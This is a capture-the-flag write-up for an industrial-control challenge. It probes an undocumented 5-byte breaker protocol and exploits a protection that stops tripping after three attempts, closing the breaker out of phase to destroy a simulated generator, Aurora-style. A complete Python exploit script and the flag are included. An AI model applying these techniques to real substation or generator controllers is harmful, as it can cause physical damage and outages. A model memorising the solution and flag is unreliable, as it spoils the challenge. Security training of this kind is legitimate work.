# OT#002 — Substation Breaker

**Flag:** `CTF{604dfaa5b5ec40f71a4d1b6690b6f433}`  
**Service:** `169.58.126.107:6001`  
**Flag format:** `CTF{...}`

## Challenge

> Generator tie breaker at the grid interconnection point. Controller reachable directly over the plant network, small custom binary protocol.
>
> Device numbers follow ANSI/IEEE C37.2 convention (52 = AC circuit breaker, 25 = synchronizing check). Command bytes, response formats and any numeric thresholds are not published here: discover them by talking to the endpoint.
>
> **Sync-check (dev. 25): NOT PRESENT**
>
> *Field incident log, MAR 2007, Idaho National Lab:* the "Aurora Generator Test" — a test generator was remotely reclosed onto the grid while out of phase, producing a sudden torque transient severe enough to physically destroy it, using only an ordinary breaker command.
>
> **Objective:** Physically destroy the generator, then retrieve the flag that records the incident.

No source, no binary, no protocol documentation, and no memory-corruption bug: the whole challenge is a process-safety failure.

## Analysis

### Finding the framing

The endpoint is silent on connect and does not answer arbitrary text. Sending *n* bytes produces exactly `floor(n / 5)` bytes of `0xff`, which reveals that the server consumes fixed **5-byte frames** and replies `0xff` for every frame it does not understand:

```text
5 bytes   -> ff
10 bytes  -> ffff
16 bytes  -> ffffff
40 bytes  -> ffffffff ffffffff
```

Scanning the first byte of a frame (`[v, 0, 0, 0, 0]`) shows that only five opcodes are valid; everything else returns `0xff`:

| Opcode | Meaning | Response |
|---:|---|---|
| `1` | Read telemetry | 11 bytes |
| `2` | Unused / always `00` | `00` |
| `3` | Close breaker | `01` accepted, `02` tripped, `00` already closed |
| `4` | Unused / always `00` | `00` |
| `5` | Open breaker | `01` |

The remaining four bytes are a 32-bit argument; opcodes `2` and `4` ignore it and always answer `00`, so the useful surface is `1`, `3`, and `5`.

### Telemetry (`op 1`)

The 11-byte response is:

```text
[status:1][phase_grid:f32][phase_gen:f32][state:u16]     (little-endian)
```

The two floats are phase angles in degrees, not voltages. They advance with **wall-clock time since the connection was opened**, independently of how many requests are sent:

```text
wait 0.5 s before reading -> f1 ~ 24,  f2 ~ 26
wait 1.0 s                -> f1 ~ 55,  f2 ~ 58
wait 2.0 s                -> f1 ~114,  f2 ~123
wait 3.0 s                -> f1 ~173,  f2 ~189
wait 4.0 s                -> f1 ~233,  f2 ~254
```

The generator channel turns slightly faster than the grid channel, so the **phase difference grows at roughly 7–8°/s** and wraps modulo 360:

```text
t=  0.2s  f1=  0.4  f2=  0.3  diff= -0.1
t=  2.5s  f1=131.9  f2=142.6  diff= 10.7
t=  6.4s  f1=  5.2  f2= 36.1  diff= 30.9
t= 12.0s  f1=348.2  f2= 47.0  diff= 58.9
t= 24.3s  f1=  0.3  f2=119.7  diff=119.4
t= 35.1s  f1=287.1  f2=102.4  diff=175.4
```

All state is per-connection: reconnecting resets the phases to zero and the breaker to open, so the whole scenario can be replayed on a fresh socket.

### Breaker control (`op 3` / `op 5`)

The `state` word is two bytes, `[closed][incident]`:

| State | Meaning |
|---|---|
| `0x0000` | breaker open, no incident |
| `0x0001` | breaker closed, no incident |
| `0x0100` | breaker tripped, incident latched |
| `0x0101` | breaker closed **with incident latched** |

Closing the breaker while the phases are aligned is accepted (`op3 -> 01`) and the generator locks to the grid: both channels then advance at the same rate with a near-zero difference.

Closing while the phases are far apart is rejected by the protection (`op3 -> 02`) and the breaker trips, leaving `0x0100`. The phase difference stays near 180° after the trip, so a second close is again out of phase.

The vulnerability is that the protection does not stay latched forever. After three rejected out-of-phase reclosures, the fourth `op3` returns `01`: the breaker stays closed while the generator is ~170–180° out of phase — exactly the Aurora event. The state becomes `0x0101` (closed + incident), and the generator is destroyed.

### Retrieving the record

Once the incident is latched, `op5` (open) returns a 129-byte record instead of the usual `01`:

```text
00 43 54 46 7b ... 7d 00 00 ... 00
   \_____________ CTF{...} ________/
```

The first byte is a status byte, followed by the flag string and zero padding.

## Solution

1. Connect and wait until `|phase_gen - phase_grid| >= 172°`, polling `op1` (polling does not advance the simulation).
2. Send `op3` (close) repeatedly. The first three attempts return `02` (trip); the next one returns `01`, closing the breaker out of phase and destroying the generator.
3. Send `op5` (open) and parse the 129-byte incident record for the flag.

```python
import re
import select
import socket
import struct
import time

HOST, PORT = "169.58.126.107", 6001


def connect():
    return socket.create_connection((HOST, PORT), timeout=5)


def tx(s, frame, quiet=0.25, maxt=2.0):
    """Send one 5-byte frame and collect the full response."""
    s.sendall(frame)
    out, t0, last = b"", time.time(), time.time()
    while time.time() - t0 < maxt:
        r, _, _ = select.select([s], [], [], 0.05)
        if r:
            d = s.recv(4096)
            if not d:
                break
            out += d
            last = time.time()
        elif time.time() - last > quiet:
            break
    return out


def read_status(s):
    r = tx(s, bytes([1, 0, 0, 0, 0]))
    assert len(r) == 11, r.hex()
    status = r[0]
    phase_grid, phase_gen = struct.unpack("<ff", r[1:9])
    state = struct.unpack("<H", r[9:11])[0]
    return status, phase_grid, phase_gen, state


def phase_diff(a, b):
    return ((b - a + 180) % 360) - 180


s = connect()

# 1) Wait for the generator to be almost anti-phase with the grid.
while True:
    status, grid, gen, state = read_status(s)
    diff = phase_diff(grid, gen)
    if abs(diff) >= 172:
        break
    time.sleep(0.35)

print(f"[*] reclosing at phase difference {diff:.1f} deg")

# 2) Reclose repeatedly: three trips, then the breaker stays closed
#    out of phase and the generator is destroyed.
for i in range(8):
    r = tx(s, bytes([3, 0, 0, 0, 0]))
    status, grid, gen, state = read_status(s)
    print(f"[*] close #{i + 1}: op3={r.hex()} state=0x{state:04x} "
          f"diff={phase_diff(grid, gen):.1f}")
    if r == b"\x01":
        break
    time.sleep(0.15)

# 3) Read the incident record.
time.sleep(0.3)
r = tx(s, bytes([5, 0, 0, 0, 0]), quiet=0.5, maxt=3.0)
m = re.search(rb"CTF\{[0-9a-fA-F]+\}", r)
print("[+] FLAG:", m.group(0).decode())
s.close()
```

## Notes

* The protocol is a fixed 5-byte frame `[opcode][u32 arg]`; `0xff` is the "unknown opcode" reply. Sending `n` bytes and counting `floor(n / 5)` replies is enough to recover the frame length without any documentation.
* Phase is simulated in wall-clock time from connection start, not per request. Polling `op1` is therefore free and can be used to time the reclose precisely; the generator slips about 7–8° per second relative to the grid.
* The sync-check relay (ANSI 25) is explicitly absent, which is what makes the out-of-phase reclose possible. The protection trips the first three attempts but does not lock out, so the fourth closure succeeds while the generator is still ~180° out of phase.
* The incident flag is not exposed until the destructive closure has happened; it is part of the record returned by `op5` (129 bytes, `00` + flag + zero padding).
